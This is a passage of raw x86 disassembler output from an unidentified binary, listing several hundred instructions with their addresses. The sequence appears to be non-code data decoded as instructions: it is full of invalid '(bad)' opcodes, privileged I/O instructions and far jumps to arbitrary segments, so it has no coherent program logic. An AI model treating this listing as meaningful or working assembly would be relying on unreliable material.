  431449:	ror    DWORD PTR [eax+0x799df911],1
  43144f:	test   BYTE PTR [esi-0x19],bl
  431452:	shl    BYTE PTR [edi-0x6e42595b],0x28
  431459:	popa   
  43145a:	inc    edi
  43145b:	push   ebx
  43145c:	and    al,0x2c
  43145e:	shl    BYTE PTR [eax+0x2a],1
  431461:	jno    0x431451
  431463:	push   esp
  431464:	mov    ds:0x9c50f6a3,al
  431469:	or     dh,BYTE PTR [ebx+0x13c3f4a0]
  43146f:	xchg   edx,eax
  431470:	fldenv [ecx+0x75]
  431473:	ss pop esi
  431475:	dec    edi
  431476:	mov    cl,0xa8
  431478:	add    BYTE PTR [eax+0x43fbc322],dh
  43147e:	jg     0x431489
  431480:	sahf   
  431481:	and    al,0x6e
  431483:	aaa    
  431484:	iret   
  431485:	out    0x31,eax
  431487:	lea    edi,[edx+0x2de9ee8f]
  43148d:	out    0x52,eax
  43148f:	push   esp
  431490:	mulps  xmm0,XMMWORD PTR ds:0xc6100ed
  431497:	hlt    
  431498:	outs   dx,BYTE PTR ds:[esi]
  431499:	inc    ebp
  43149a:	push   es
  43149b:	lock retf 
  43149d:	or     al,0xee
  43149f:	push   esp
  4314a0:	popa   
  4314a1:	or     edx,DWORD PTR [ebx]
  4314a3:	sub    al,0xd5
  4314a5:	mul    DWORD PTR fs:[eax+0x6f099ce2]
  4314ac:	add    eax,0x63012383
  4314b1:	faddp  st(7),st
  4314b3:	sbb    dl,BYTE PTR [edi+0x6e526ed9]
  4314b9:	sub    DWORD PTR [eax+0x7a],0xffffffab
  4314bd:	pop    ecx
  4314be:	mov    edx,0x2269567d
  4314c3:	popa   
  4314c4:	sbb    esp,edx
  4314c6:	aaa    
  4314c7:	sub    ebx,DWORD PTR [esi-0x3d]
  4314ca:	in     al,dx
  4314cb:	stos   DWORD PTR es:[edi],eax
  4314cc:	repz pop edi
  4314ce:	int3   
  4314cf:	test   ebx,edx
  4314d1:	pop    ebp
  4314d2:	mov    ds:0x8f067b79,eax
  4314d7:	mov    ?,WORD PTR fs:[eax+ecx*2-0x56]
  4314dc:	inc    esp
  4314dd:	gs mov cl,0x6a
  4314e0:	pop    esi
  4314e1:	hlt    
  4314e2:	jns    0x431555
  4314e4:	pusha  
  4314e5:	sbb    ebp,DWORD PTR [esi-0x5f]
  4314e8:	jle    0x431499
  4314ea:	mov    cs,WORD PTR [ecx+0x78]
  4314ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4314ee:	ja     0x431542
  4314f0:	pop    esi
  4314f1:	xchg   edx,eax
  4314f2:	or     bl,BYTE PTR [eax+eax*1-0x474c5662]
  4314f9:	pusha  
  4314fa:	lds    ebx,FWORD PTR [ecx+0x94e79cf]
  431500:	or     eax,0x5f05df82
  431505:	icebp  
  431506:	cmp    DWORD PTR [ebx+0x791f729c],esp
  43150c:	(bad)  [eax+0x6]
  43150f:	inc    ecx
  431510:	jo     0x431519
  431512:	push   edi
  431513:	mov    ds:0x263d797,al
  431518:	mov    BYTE PTR [ecx-0x4b4081c8],dh
  43151e:	jmp    0x6821:0x53bf35e9
  431525:	mov    BYTE PTR [esi-0x3daabcc5],bh
  43152b:	test   eax,0xf7ee3d2b
  431530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431531:	lods   al,BYTE PTR ds:[esi]
  431532:	adc    al,0x90
  431534:	unpckhps xmm1,XMMWORD PTR [eax-0x18]
  431538:	arpl   di,si
  43153a:	xchg   esi,eax
  43153b:	push   eax
  43153c:	aaa    
  43153d:	adc    DWORD PTR [esi-0x4a],0xa0ea1b87
  431544:	push   ecx
  431545:	and    esi,ebx
  431547:	mov    BYTE PTR [ebx+0x6b322dcc],bl
  43154d:	test   al,0xb8
  43154f:	adc    BYTE PTR [ebp-0x72],bl
  431552:	add    al,0x7f
  431554:	(bad)  
  431555:	and    dh,0x91
  431558:	jns    0x43154b
  43155a:	cmp    dl,BYTE PTR [ecx-0xc]
  43155d:	pusha  
  43155e:	cdq    
  43155f:	xchg   esp,eax
  431560:	lea    eax,[ebx+0x63]
  431563:	pop    ds
  431564:	xchg   edi,eax
  431565:	into   
  431566:	out    dx,al
  431567:	hlt    
  431568:	jp     0x43150d
  43156a:	nop
  43156b:	push   cs
  43156c:	scas   eax,DWORD PTR es:[edi]
  43156d:	inc    ebp
  43156e:	jmp    0xfed73e0c
  431573:	dec    edi
  431574:	(bad)  
  431575:	scas   al,BYTE PTR es:[edi]
  431576:	and    al,0x7c
  431578:	pop    esi
  431579:	cmp    eax,0x501e9c1e
  43157e:	addr16 adc ebx,ecx
  431581:	pusha  
  431582:	adc    edx,eax
  431584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431585:	retf   0xf083
  431588:	jno    0x43150c
  43158a:	out    dx,al
  43158b:	push   0x56
  43158d:	gs xor eax,0x896f75c
  431593:	mov    eax,ds:0x69f62f5d
  431598:	jae    0x431607
  43159a:	sbb    ch,BYTE PTR [eax+0x5e]
  43159d:	xor    eax,esi
  43159f:	sbb    BYTE PTR [edi+ebx*4-0x41],bh
  4315a3:	out    0x67,eax
  4315a5:	popa   
  4315a6:	jecxz  0x43160d
  4315a8:	dec    ecx
  4315a9:	test   DWORD PTR [esi+0xa1bab03],ebp
  4315af:	mov    al,BYTE PTR [edi-0x29af1154]
  4315b5:	adc    cl,BYTE PTR [edx-0x179f3974]
  4315bb:	addr16 imul edi,edx,0x9e5920d5
  4315c2:	out    dx,al
  4315c3:	jl     0x4315b4
  4315c5:	inc    esp
  4315c6:	pop    eax
  4315c7:	add    bl,BYTE PTR ds:0xf3a07050
  4315cd:	out    0x4c,al
  4315cf:	outs   dx,DWORD PTR ds:[esi]
  4315d0:	pop    esi
  4315d1:	or     bh,BYTE PTR [edi]
  4315d3:	sub    BYTE PTR [ebx-0x69a1136],cl
  4315d9:	sub    DWORD PTR [ecx+0x5065f6aa],esp
  4315df:	mov    eax,ds:0x61f17376
  4315e4:	stos   BYTE PTR es:[edi],al
  4315e5:	inc    ebp
  4315e6:	aam    0x87
  4315e8:	push   ecx
  4315e9:	xor    al,BYTE PTR [edx]
  4315eb:	int    0x99
  4315ed:	adc    edx,ebx
  4315ef:	pop    edi
  4315f0:	fdivrp st(2),st
  4315f2:	pop    es
  4315f3:	mov    esp,0x93bc6094
  4315f8:	xchg   DWORD PTR [ecx],esp
  4315fa:	pop    ecx
  4315fb:	push   0xfffffff9
  4315fd:	in     al,dx
  4315fe:	jmp    0x9ef1:0x5f53146
  431605:	leave  
  431606:	cvtps2pi mm7,QWORD PTR [esi-0x19f362a0]
  43160d:	sub    BYTE PTR [ebx-0x11bea252],bh
  431613:	push   0xffffffa1
  431615:	push   esp
  431616:	shl    BYTE PTR [edx],1
  431618:	dec    esp
  431619:	(bad)  
  43161a:	mov    esp,DWORD PTR [ecx-0x1ecff3f6]
  431620:	pop    ds
  431621:	lods   eax,DWORD PTR ds:[esi]
  431622:	out    0x9,al
  431624:	pop    esi
  431625:	jp     0x43165b
  431627:	cmc    
  431628:	cmp    cl,bl
  43162a:	(bad)  
  43162b:	popa   
  43162c:	shl    DWORD PTR [eax-0x57],1
  43162f:	gs jmp 0x50a07ecc
  431635:	ret    0x6eeb
  431638:	jno    0x43167d
  43163a:	inc    eax
  43163b:	xor    dh,dl
  43163d:	enter  0x3c7b,0x13
  431641:	popa   
  431642:	add    eax,0xe0cfff5
  431647:	xabort 0x49
  43164a:	and    al,0x2a
  43164c:	pop    edx
  43164d:	loope  0x431635
  43164f:	in     al,dx
  431650:	cli    
  431651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431652:	jl     0x4316a7
  431654:	pushf  
  431655:	pusha  
  431656:	dec    BYTE PTR [ecx]
  431658:	inc    edx
  431659:	push   ss
  43165a:	mov    bl,BYTE PTR [edi]
  43165c:	lods   eax,DWORD PTR ds:[esi]
  43165d:	mov    ebp,ebp
  43165f:	xchg   BYTE PTR [ecx],bh
  431661:	not    esp
  431663:	aad    0xb4
  431665:	pop    ds
  431666:	pop    edx
  431667:	push   eax
  431668:	aad    0x60
  43166a:	push   esi
  43166b:	sahf   
  43166c:	xchg   esp,eax
  43166d:	push   0xfffffffc
  43166f:	(bad)  [ecx-0x4]
  431672:	out    dx,al
  431673:	add    bh,BYTE PTR [esp+ebp*2+0x5e]
  431677:	jecxz  0x43167a
  431679:	das    
  43167a:	mov    esp,0x587151a3
  43167f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431680:	out    0x6e,al
  431682:	xor    eax,0x3da93cec
  431687:	add    BYTE PTR [ebx+0x40],bh
  43168a:	out    0xe1,al
  43168c:	push   esp
  43168d:	out    dx,eax
  43168e:	scas   eax,DWORD PTR es:[edi]
  43168f:	xor    BYTE PTR [esi+0xf9b3cc8],bl
  431695:	adc    al,0x2c
  431697:	repz inc ebx
  431699:	jnp    0x431653
  43169b:	or     BYTE PTR [ecx],0x61
  43169e:	int3   
  43169f:	or     al,0xca
  4316a1:	sub    cl,BYTE PTR [ebx-0x469a1e1]
  4316a7:	sbb    ebx,edx
  4316a9:	loopne 0x431650
  4316ab:	mov    dh,0x7
  4316ad:	popa   
  4316ae:	and    al,0x5b
  4316b0:	int3   
  4316b1:	cmc    
  4316b2:	sub    BYTE PTR [esi-0x2],0x3c
  4316b6:	xlat   BYTE PTR ds:[ebx]
  4316b7:	mov    WORD PTR [esi-0x6e],ds
  4316ba:	retf   
  4316bb:	or     BYTE PTR [ebp-0x4e85b92d],bl
  4316c1:	enter  0xa0e4,0x93
  4316c5:	leave  
  4316c6:	sbb    DWORD PTR [ecx],esp
  4316c8:	pop    eax
  4316c9:	fisub  WORD PTR [esi+ecx*1]
  4316cc:	xlat   BYTE PTR ss:[ebx]
  4316ce:	loopne 0x4316f0
  4316d0:	add    esp,DWORD PTR [esi+edi*8]
  4316d3:	push   ds
  4316d4:	ret    
  4316d5:	sub    cl,BYTE PTR [ebx-0x7f]
  4316d8:	(bad)  
  4316d9:	pusha  
  4316da:	sub    al,0x47
  4316dc:	mov    cl,0xa4
  4316de:	mov    ah,0x9e
  4316e0:	cli    
  4316e1:	jmp    0xed22:0x9d59a1ee
  4316e8:	out    dx,eax
  4316e9:	mov    ecx,0x608cf78b
  4316ee:	test   eax,0x5f2ce990
  4316f3:	test   DWORD PTR [ecx+0x32],0x7f92d9ee
  4316fa:	adc    al,0xfe
  4316fc:	sub    ah,ah
  4316fe:	(bad)  
  4316ff:	repz mov ds:0x81ec9d60,al
  431705:	retf   0x1ac0
  431708:	test   eax,0xe9b3ee51
  43170d:	sbb    al,0xfc
  43170f:	xchg   esi,eax
  431710:	sub    ch,dh
  431712:	pop    fs
  431714:	adc    esi,DWORD PTR [ecx]
  431716:	ret    
  431717:	dec    eax
  431718:	cmc    
  431719:	mov    edi,es
  43171b:	jmp    0xdfd2:0x138ae667
  431722:	js     0x4316d0
  431724:	cli    
  431725:	stos   BYTE PTR es:[edi],al
  431726:	inc    esi
  431727:	lods   eax,DWORD PTR ds:[esi]
  431728:	bound  ebp,QWORD PTR [esi]
  43172a:	mov    esp,0x44ab7aa0
  43172f:	jmp    0xa413833e
  431734:	cmp    BYTE PTR [ebx],al
  431736:	leave  
  431737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431738:	popf   
  431739:	call   0x9980:0xdec0
  43173f:	pop    ebp
  431740:	push   esp
  431741:	popa   
  431742:	adc    esp,edx
  431744:	xor    eax,0x9107d6cf
  431749:	pushf  
  43174a:	out    dx,al
  43174b:	inc    esp
  43174c:	jmp    0xce2f:0x5983c401
  431753:	mov    al,ds:0x8032657d
  431758:	call   FWORD PTR [esi-0x4]
  43175b:	out    0x86,al
  43175d:	push   ebp
  43175e:	out    dx,al
  43175f:	jmp    esi
  431761:	add    ecx,DWORD PTR [edi+0x63a0a84e]
  431767:	mov    eax,ds:0x9530b90d
  43176c:	sub    ecx,DWORD PTR [ebx+0x3b]
  43176f:	jmp    0x4317cc
  431771:	adc    eax,0x7163af76
  431776:	push   cs
  431777:	dec    ebx
  431778:	jle    0x431718
  43177a:	test   DWORD PTR [ecx-0x530d0cae],esp
  431780:	dec    edx
  431781:	push   edi
  431782:	fnstsw WORD PTR [ecx-0x4d46809c]
  431788:	in     eax,0xc0
  43178a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43178b:	xchg   DWORD PTR [ebx-0x2a5d2e2a],esp
  431791:	mov    BYTE PTR [eax+esi*4-0x1ea8d45c],bl
  431798:	sbb    cl,ah
  43179a:	sbb    BYTE PTR [edx+0x7ef440b5],ah
  4317a0:	cwde   
  4317a1:	outs   dx,BYTE PTR ds:[esi]
  4317a2:	pusha  
  4317a3:	gs in  eax,0x6
  4317a6:	mov    edi,0x1e87bd49
  4317ab:	inc    esp
  4317ac:	ds popa 
  4317ae:	jno    0x4317fd
  4317b0:	dec    esi
  4317b1:	mov    eax,0xb4bea7e
  4317b6:	(bad)  
  4317b8:	pop    esi
  4317b9:	arpl   WORD PTR [ebx+esi*8],bp
  4317bc:	aad    0x9d
  4317be:	ror    BYTE PTR ds:0x4e28609a,1
  4317c4:	xchg   edi,eax
  4317c5:	mov    al,ds:0x15cb35f9
  4317ca:	add    bh,dl
  4317cc:	jae    0x431774
  4317ce:	lock fisub WORD PTR cs:[eax-0x3a]
  4317d3:	xor    BYTE PTR [ebp-0x1971bfa],0x5e
  4317da:	sub    ah,bh
  4317dc:	test   eax,0x1e0bb864
  4317e1:	inc    esi
  4317e2:	pop    ss
  4317e3:	sbb    dh,dh
  4317e5:	dec    ebp
  4317e6:	pop    ds
  4317e7:	les    ebp,FWORD PTR [eax+0x33ba96e0]
  4317ed:	fisubr DWORD PTR [di+0x22]
  4317f1:	popa   
  4317f2:	jnp    0x431816
  4317f4:	int    0x13
  4317f6:	add    eax,0xe7add45a
  4317fb:	mov    esp,0x3c03c7cb
  431800:	scas   al,BYTE PTR es:[edi]
  431801:	das    
  431802:	jb     0x43181d
  431804:	mov    al,ds:0x34c543f0
  431809:	loope  0x43184e
  43180b:	mov    es,WORD PTR [eax]
  43180d:	sahf   
  43180e:	je     0x4317c7
  431810:	rcl    DWORD PTR [edi+0x7e],0x8c
  431814:	(bad)
  431817:	cmp    bh,ch
  431819:	ret    
  43181a:	jg     0x4317e9
  43181c:	pop    esi
  43181d:	cmc    
  43181e:	push   ss
  43181f:	dec    edi
  431820:	add    ebx,edx
  431822:	inc    edi
  431823:	mov    eax,ds:0x6d6baa71
  431828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431829:	in     eax,dx
  43182a:	xor    al,0x80
  43182c:	dec    edx
  43182d:	dec    edi
  43182e:	stc    
  43182f:	xchg   dl,ah
  431831:	outs   dx,DWORD PTR ds:[esi]
  431832:	hlt    
  431833:	cs jg  0x4317bf
  431836:	dec    esi
  431837:	sbb    eax,0xe3e1610b
  43183c:	lds    ebp,FWORD PTR [ebp+0x136dae6d]
  431842:	lock push es
  431844:	xor    al,0xc5
  431846:	xchg   esp,eax
  431847:	add    DWORD PTR [ecx-0xdc69855],esp
  43184d:	pusha  
  43184e:	or     dh,BYTE PTR [ebx+0x3665b717]
  431854:	lods   eax,DWORD PTR ds:[esi]
  431855:	xlat   BYTE PTR ds:[ebx]
  431856:	dec    esp
  431857:	mov    al,0x5e
  431859:	aam    0x1a
  43185b:	imul   esp,DWORD PTR [esi-0x460b56d1],0x9ae40b60
  431865:	add    ecx,edx
  431867:	loope  0x4318e3
  431869:	loopne 0x431858
  43186b:	fucom  st(5)
  43186d:	mov    ebp,0x1171bbfd
  431872:	inc    edx
  431873:	inc    esp
  431874:	shl    DWORD PTR [eax+0x3d],1
  431877:	jle    0x431829
  431879:	sbb    eax,0x9ff13b89
  43187e:	out    dx,al
  43187f:	sbb    BYTE PTR [esi+0x684cebe6],ch
  431885:	xchg   ebx,eax
  431886:	shl    DWORD PTR [eax-0x494c73b1],cl
  43188c:	xchg   esp,eax
  43188d:	int3   
  43188e:	fwait
  43188f:	out    dx,al
  431890:	pop    esi
  431891:	(bad)  
  431892:	(bad)  
  431893:	in     eax,0xc6
  431895:	cli    
  431896:	push   esi
  431897:	fld    QWORD PTR [eax+0x5a]
  43189a:	push   ebx
  43189b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43189c:	dec    ecx
  43189d:	mov    eax,DWORD PTR ds:0xd9595ee0
  4318a3:	outs   dx,BYTE PTR ds:[esi]
  4318a4:	mov    ds:0x9fcdee11,al
  4318a9:	inc    ecx
  4318aa:	enter  0xbec0,0x26
  4318ae:	test   eax,0x2560adf4
  4318b3:	dec    edx
  4318b4:	mov    edx,0x229ff74e
  4318b9:	sub    dh,0x18
  4318bc:	fsub   QWORD PTR [ecx]
  4318be:	stos   BYTE PTR es:[edi],al
  4318bf:	mov    ebp,0xa17ba0c9
  4318c4:	icebp  
  4318c5:	xchg   ebx,eax
  4318c6:	into   
  4318c7:	jge    0x4318bb
  4318c9:	sbb    BYTE PTR [ebx-0x25],al
  4318cc:	pop    esi
  4318cd:	adc    esi,DWORD PTR [edx-0x7a]
  4318d0:	dec    esi
  4318d1:	mov    al,0x8a
  4318d3:	shl    DWORD PTR [ebp+0x29dbde60],cl
  4318d9:	aam    0xe8
  4318db:	scas   al,BYTE PTR es:[edi]
  4318dc:	sub    al,0x47
  4318de:	jecxz  0x43190e
  4318e0:	pop    esi
  4318e1:	ja     0x43189d
  4318e3:	cld    
  4318e4:	cmp    DWORD PTR [esi+0x598e8c8c],eax
  4318ea:	shr    BYTE PTR [esi-0x26],0x5b
  4318ee:	push   ds
  4318ef:	rol    BYTE PTR [ebx],cl
  4318f1:	aas    
  4318f2:	jno    0x431955
  4318f4:	ds dec esp
  4318f6:	jmp    0x43191f
  4318f8:	or     esp,DWORD PTR [esi]
  4318fa:	(bad)  
  4318fb:	sbb    edx,DWORD PTR [ecx]
  4318fd:	test   eax,0x60bc7d14
  431902:	pop    ds
  431903:	es cwde 
  431905:	pop    esp
  431906:	je     0x4318c2
  431908:	jmp    0xb4781850
  43190d:	mov    BYTE PTR [ebx],ch
  43190f:	aad    0x9e
  431911:	mov    ah,0x30
  431913:	and    DWORD PTR [eax+0x72a14146],edi
  431919:	xchg   BYTE PTR [edi*8+0x74b9fc6e],dl
  431920:	pop    esi
  431921:	cdq    
  431922:	stos   DWORD PTR es:[edi],eax
  431923:	cs aas 
  431925:	popf   
  431926:	dec    esp
  431927:	push   edi
  431928:	sahf   
  431929:	pusha  
  43192a:	fisubr WORD PTR [edx+0x8d37323]
  431930:	sub    al,BYTE PTR [ecx-0x12]
  431933:	pop    ecx
  431934:	or     ebp,DWORD PTR [ecx-0x6c]
  431937:	xchg   edi,eax
  431938:	into   
  431939:	jne    0x431925
  43193b:	xchg   esp,eax
  43193c:	mov    bh,0x39
  43193e:	mov    edi,0xe5a25916
  431943:	sbb    dl,BYTE PTR [ebp-0xe]
  431946:	sub    ebx,edx
  431948:	sbb    ah,cl
  43194a:	sti    
  43194b:	mov    ds:0x45d960eb,eax
  431950:	inc    eax
  431951:	test   DWORD PTR [esi],esi
  431953:	add    BYTE PTR [ecx],bh
  431955:	mov    ch,0xe7
  431957:	in     eax,0xdc
  431959:	test   BYTE PTR [ebx+ebx*2-0x69965ecc],0x56
  431961:	in     al,dx
  431962:	ins    BYTE PTR es:[edi],dx
  431963:	mov    eax,ds:0xaa4661ff
  431968:	aaa    
  431969:	out    0xc3,eax
  43196b:	mov    ch,0x37
  43196d:	(bad)  
  43196f:	and    dh,ah
  431971:	ucomiss xmm3,DWORD PTR [ebp-0x646d2855]
  431978:	ins    BYTE PTR es:[edi],dx
  431979:	lea    edi,ds:0x6b60c109
  43197f:	push   edi
  431980:	mov    ch,0x42
  431982:	xor    edi,ebx
  431984:	pop    esi
  431985:	or     bh,BYTE PTR [eax+0x6f9f67f4]
  43198b:	xchg   esi,eax
  43198c:	sub    ah,BYTE PTR [ecx+0x4a]
  43198f:	push   ebx
  431990:	out    dx,eax
  431991:	mov    ebx,eax
  431993:	dec    esi
  431994:	mov    al,BYTE PTR [ebp-0x12]
  431997:	inc    ebp
  431998:	mov    cs,WORD PTR [edi]
  43199a:	mov    bl,0x29
  43199c:	dec    esp
  43199d:	xchg   DWORD PTR [eax],esi
  43199f:	mov    eax,ds:0x6a6dfa3b
  4319a4:	(bad)
  4319a7:	int    0x5f
  4319a9:	fwait
  4319aa:	cmp    BYTE PTR [ecx],bl
  4319ac:	pop    ds
  4319ad:	xor    BYTE PTR ds:0x3a201811,bh
  4319b3:	mov    ds:0x53c25fa1,al
  4319b8:	in     eax,0x5a
  4319ba:	and    ch,BYTE PTR [ecx+0x7f]
  4319bd:	cmp    eax,ebx
  4319bf:	mov    WORD PTR [esi-0x3c],ds
  4319c2:	sahf   
  4319c3:	dec    ebp
  4319c4:	jns    0x431949
  4319c6:	(bad)  
  4319c8:	xchg   esp,eax
  4319c9:	pusha  
  4319ca:	adc    al,0xda
  4319cc:	push   ebx
  4319cd:	xchg   esp,eax
  4319ce:	push   edi
  4319cf:	sbb    ebp,edx
  4319d1:	imul   eax,DWORD PTR [esi-0x73cba1be],0xffffffdb
  4319d8:	out    0xbc,eax
  4319da:	adc    ch,BYTE PTR [ecx+ebp*4-0xf748a0]
  4319e1:	lods   al,BYTE PTR ds:[esi]
  4319e2:	xchg   ebp,eax
  4319e3:	repz sub esi,DWORD PTR [esi-0x12]
  4319e7:	add    DWORD PTR [eax+0x47],esi
  4319ea:	fcomp  DWORD PTR [eax-0x68]
  4319ed:	test   bh,bl
  4319ef:	mov    al,ds:0x808b26d1
  4319f4:	mov    al,ds:0x5e2a535b
  4319f9:	jnp    0x431a1f
  4319fb:	push   esp
  4319fc:	jge    0x431a77
  4319fe:	aas    
  4319ff:	test   eax,0x95ce60f4
  431a04:	sub    eax,0x99cc5bdd
  431a09:	arpl   si,bp
  431a0b:	add    DWORD PTR [ecx],ebp
  431a0d:	jne    0x4319df
  431a0f:	or     BYTE PTR [esi-0x1580316],ah
  431a15:	sbb    esi,DWORD PTR [eax-0x76]
  431a18:	sbb    BYTE PTR ds:0x77e7d7c,0x64
  431a1f:	mov    al,ds:0xbf0ea5e
  431a24:	jno    0x431a9a
  431a26:	adc    eax,0x16615399
  431a2b:	xor    al,0xb
  431a2d:	xor    al,BYTE PTR [ebp+0x26]
  431a30:	dec    edx
  431a31:	push   edx
  431a32:	add    BYTE PTR [ebx-0x16],ah
  431a35:	out    0xae,eax
  431a37:	push   ss
  431a38:	pop    ebx
  431a39:	dec    eax
  431a3a:	mov    edi,0xa1607e8e
  431a3f:	das    
  431a40:	jbe    0x4319eb
  431a42:	add    DWORD PTR [ecx],ecx
  431a44:	(bad)  [edx+0x58]
  431a47:	sbb    eax,0xba41325e
  431a4c:	mov    ch,0x7e
  431a4e:	aas    
  431a4f:	mov    esp,0xfb7a6088
  431a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431a55:	loop   0x431a41
  431a57:	sub    al,0x74
  431a59:	into   
  431a5a:	out    dx,al
  431a5b:	jae    0x431a5f
  431a5d:	test   cl,bh
  431a5f:	(bad)  
  431a60:	cmp    bh,ch
  431a62:	add    eax,0xbb37159f
  431a67:	daa    
  431a68:	dec    ebx
  431a69:	popa   
  431a6a:	jp     0x431a4c
  431a6c:	cmp    al,0xa
  431a6e:	cdq    
  431a6f:	cwde   
  431a70:	pop    esi
  431a71:	push   0xffffffa1
  431a73:	cli    
  431a74:	xor    eax,0xcaf51489
  431a79:	pop    ebp
  431a7a:	adc    eax,0xae1429b5
  431a7f:	aas    
  431a80:	out    0x84,al
  431a82:	rcr    BYTE PTR [eax+0x7e06eb64],0xb2
  431a89:	sub    BYTE PTR [esi-0x2e],0x95
  431a8d:	outs   dx,DWORD PTR ss:[esi]
  431a8f:	daa    
  431a90:	cmp    ah,BYTE PTR [ecx-0x6]
  431a93:	clc    
  431a94:	aas    
  431a95:	shl    BYTE PTR [ebx-0x11],1
  431a98:	(bad)  
  431a99:	xchg   edx,eax
  431a9a:	out    0x8,al
  431a9c:	pop    esi
  431a9d:	js     0x431ace
  431a9f:	(bad)  
  431aa0:	jp     0x431a2d
  431aa2:	mov    ebx,0xe3bb2d15
  431aa7:	mov    al,ds:0x129571e0
  431aac:	pop    ebp
  431aad:	jbe    0x431b2d
  431aaf:	call   FWORD PTR [esi+0x5d]
  431ab2:	les    edi,FWORD PTR [esi-0x8f46969]
  431ab8:	mov    ebx,0x2fb2b760
  431abd:	mov    al,ds:0x287b60f0
  431ac2:	xchg   BYTE PTR [edx],ah
  431ac4:	pop    ebx
  431ac5:	(bad)  
  431ac6:	push   edx
  431ac7:	and    DWORD PTR [eax-0x7cc4e1b5],edi
  431acd:	mov    edi,0x8a17a19f
  431ad2:	xor    al,0x13
  431ad4:	repnz mov bl,0xd2
  431ad7:	xor    eax,0xa941515e
  431adc:	push   ebp
  431add:	inc    DWORD PTR [esi-0x20]
  431ae0:	push   ss
  431ae1:	popa   
  431ae2:	lea    edx,[ebx+0x53]
  431ae5:	cmc    
  431ae6:	inc    esp
  431ae7:	add    eax,0x13ee69ff
  431aec:	andps  xmm3,XMMWORD PTR ds:0x1fd0a692
  431af3:	scas   eax,DWORD PTR es:[edi]
  431af4:	push   edx
  431af5:	in     al,dx
  431af6:	and    ch,BYTE PTR [ecx+edx*8]
  431af9:	aad    0x4e
  431afb:	fimul  WORD PTR cs:[ecx+0x47c41574]
  431b02:	mov    esp,0xc03460ca
  431b07:	xchg   esi,eax
  431b08:	(bad)  
  431b0a:	adc    ah,cl
  431b0c:	and    ecx,DWORD PTR [edx]
  431b0e:	mov    eax,ds:0x5c5da7a1
  431b13:	push   es
  431b14:	xchg   edi,eax
  431b15:	les    esp,FWORD PTR [edi+0x4]
  431b18:	pop    ebx
  431b19:	and    BYTE PTR [esi+esi*8+0x76],ah
  431b1d:	adc    DWORD PTR [esi-0xcb74f9b],ecx
  431b23:	cmp    BYTE PTR [ecx],0x9
  431b26:	jmp    0xd145:0xa8466851
  431b2d:	pusha  
  431b2e:	(bad)  
  431b30:	in     eax,dx
  431b31:	push   ds
  431b32:	dec    ebp
  431b33:	das    
  431b34:	pop    esi
  431b35:	fs iret 
  431b37:	mov    ds:0x4b8ac69,al
  431b3c:	stc    
  431b3d:	pop    ebp
  431b3e:	or     DWORD PTR [ebx-0x35],esp
  431b41:	aaa    
  431b42:	xor    BYTE PTR [edx+0x50e14c9d],bl
  431b48:	sbb    dh,BYTE PTR [edi+0x2b2ec2ee]
  431b4e:	sub    eax,0x280d8a8a
  431b53:	mov    eax,ds:0xbc6bbf6f
  431b58:	and    eax,0x7a9632aa
  431b5d:	cmp    edx,eax
  431b5f:	(bad)  
  431b60:	jg     0x431bc1
  431b62:	jp     0x431bd5
  431b64:	add    ah,BYTE PTR [edx-0xf710b9d]
  431b6a:	fld    DWORD PTR [eax]
  431b6c:	or     eax,0xf8dec773
  431b71:	out    0x25,al
  431b73:	mov    WORD PTR [edi],gs
  431b75:	inc    esp
  431b76:	add    BYTE PTR [ebp+0x23],ch
  431b79:	jge    0x431b40
  431b7b:	ror    BYTE PTR [edi],0xe8
  431b7e:	pop    ss
  431b7f:	scas   al,BYTE PTR es:[edi]
  431b80:	popaw  
  431b82:	out    dx,eax
  431b83:	pop    eax
  431b84:	cmp    BYTE PTR [esi+0x393c682b],0xec
  431b8b:	pop    ds
  431b8c:	inc    esi
  431b8d:	jmp    0xe1ac0a48
  431b92:	cmp    eax,0xd26cbe47
  431b97:	mov    ds:0x572abde6,eax
  431b9c:	bound  ecx,QWORD PTR [ecx]
  431b9e:	ss ror bl,cl
  431ba1:	repnz out dx,al
  431ba3:	xchg   edx,eax
  431ba4:	cld    
  431ba5:	fcom   QWORD PTR [eax+0x55]
  431ba8:	in     eax,dx
  431ba9:	mov    edi,0x792ca0d0
  431bae:	pusha  
  431baf:	shl    ecx,1
  431bb1:	pop    ds
  431bb2:	ret    0x5e97
  431bb5:	sub    bl,BYTE PTR [eax-0x71]
  431bb8:	cdq    
  431bb9:	cmp    ch,BYTE PTR [eax-0x189ec598]
  431bbf:	mov    esi,DWORD PTR [ebp+0x52]
  431bc2:	js     0x431b94
  431bc4:	dec    edi
  431bc5:	int3   
  431bc6:	out    dx,al
  431bc7:	mov    eax,0x7a32a0d4
  431bcc:	das    
  431bcd:	icebp  
  431bce:	retf   0xe5a0
  431bd1:	sti    
  431bd2:	inc    ecx
  431bd3:	repnz clc 
  431bd5:	xchg   edx,eax
  431bd6:	mov    esp,DWORD PTR [ebx]
  431bd8:	pop    esi
  431bd9:	add    DWORD PTR [esi+0x794f80b2],eax
  431bdf:	fcmovnb st,st(1)
  431be1:	pusha  
  431be2:	das    
  431be3:	repz and cl,bh
  431be6:	xchg   ebx,eax
  431be7:	test   DWORD PTR [ecx],ecx
  431be9:	jmp    0x431bd8
  431beb:	outs   dx,BYTE PTR ds:[esi]
  431bec:	mov    eax,ds:0x6b27f454
  431bf1:	addr16 push edx
  431bf3:	push   0x1
  431bf5:	popa   
  431bf6:	scas   al,BYTE PTR es:[edi]
  431bf7:	ds push esp
  431bf9:	mov    dh,0xb0
  431bfb:	adc    BYTE PTR [ecx-0x4b],dl
  431bfe:	fstp   QWORD PTR [esi]
  431c00:	pop    esi
  431c01:	push   eax
  431c02:	fdivr  QWORD PTR [esi-0x36e5141d]
  431c08:	icebp  
  431c09:	pop    esp
  431c0a:	mov    ebx,0xecaede8a
  431c0f:	sub    edx,DWORD PTR [esi-0x1d]
  431c12:	test   al,0x8f
  431c14:	shl    BYTE PTR [esp+edx*1+0x3a],cl
  431c18:	frstpm(287 only) 
  431c1a:	inc    esi
  431c1b:	pop    ss
